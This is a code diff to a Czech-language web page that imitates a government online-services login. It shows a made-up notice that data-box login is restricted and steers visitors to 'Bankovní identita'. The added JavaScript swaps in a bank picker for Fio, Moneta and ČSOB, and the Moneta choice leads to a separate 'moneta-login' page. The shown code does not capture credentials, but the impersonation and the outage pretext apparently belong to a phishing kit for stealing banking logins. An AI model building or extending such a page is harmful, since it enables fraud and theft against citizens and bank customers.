@@ -133,7 +133,7 @@ document.body.addEventListener('click', e => {
   <p style="color:white;margin:0 0 15px 0;font-size:14px;">Komunikujte s úřady online.</p>  
 
   <!-- Upozornění -->
-  <div style="display:flex;align-items:center;gap:8px;background:white;padding:10px 12px;font-size:12px;margin-bottom:15px;width:90%;">
+  <div id="alert-box" style="display:flex;align-items:center;gap:8px;background:white;padding:10px 12px;font-size:12px;margin-bottom:15px;width:90%;">
     <span class="material-icons" style="color:#d32f2f;font-size:18px;">error</span>
     <p style="margin:0;line-height:1.4;">
       Přihlášení pomocí datové schránky je nyní omezeno z důvodu plánované odstávky systému datových schránek. Děkujeme za pochopení.
@@ -141,18 +141,18 @@ document.body.addEventListener('click', e => {
   </div>          
 
   <!-- Výběr přihlášení -->
-  <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;background:white;padding:12px;width:90%;margin-bottom:40%;">
+  <div id="login-methods" style="display:flex;flex-direction:column;align-items:center;justify-content:center;background:white;padding:12px;width:90%;margin-bottom:40%;">
     <p style="font-weight:bold;margin:0 0 8px 0;">Vyberte způsob přihlášení:</p>      
 
-    <a href="#" class="sms-link" data-page="moneta-login" 
-       style="gap:20px;display:flex;align-items:center;text-decoration:none;
+    <a id="bankovniIdentitaBtn"  
+       style="cursor:pointer;gap:20px;display:flex;align-items:center;text-decoration:none;
               border:none;background:#f5f5f5;padding:15px;
               margin:4px 0;width:90%;color:inherit;">
       <img style="width:25px;" src="images/lev.png" alt="lev">
       Bankovní identita
     </a>
 
-    <p style="display:flex;align-items:center;gap:20px;border:none;background:#f9f9f9;padding:15px;
+    <p style="cursor:pointer;display:flex;align-items:center;gap:20px;border:none;background:#f9f9f9;padding:15px;
               margin:8px 0;width:90%;color:#999;">
       <span class="material-icons" style="color:#999;font-size:25px;">mail</span>  
 
@@ -171,6 +171,35 @@ document.body.addEventListener('click', e => {
 
 
       `;
+const bankBtn = document.getElementById('bankovniIdentitaBtn');
+ if (bankBtn) {
+   bankBtn.addEventListener('click', () => {
+     const methodsDiv = document.getElementById('login-methods');
+    const alertBox = document.getElementById('alert-box');
+    if (alertBox) alertBox.style.display = 'none';
+    
+     methodsDiv.innerHTML = `
+       <p style="font-weight:bold;margin:0 0 8px 0;">Vyberte svou banku:</p>
+       <a style="cursor:pointer;gap:20px;display:flex;align-items:center;text-decoration:none;
+              border:none;background:#f5f5f5;padding:15px;
+              margin:4px 0;width:90%;color:inherit;">
+              <img style="width:25px;" src="images/fio.png" alt="fio">
+              Fio banka</a>
+       <a style="cursor:pointer;gap:20px;display:flex;align-items:center;text-decoration:none;
+              border:none;background:#f5f5f5;padding:15px;
+              margin:4px 0;width:90%;color:inherit;" href="#" class="sms-link" data-page="moneta-login" >
+              <img style="width:25px;" src="images/moneta.png" alt="moneta">
+              Moneta</a>
+       <a style="cursor:pointer;gap:20px;display:flex;align-items:center;text-decoration:none;
+              border:none;background:#f5f5f5;padding:15px;
+              margin:4px 0;width:90%;color:inherit;">
+              <img style="width:25px;" src="images/csob.png" alt="csob">
+              ČSOB</a>
+
+     `;
+   });
+ }
+
       break;
     case 'Moneta':
       content.innerHTML = `
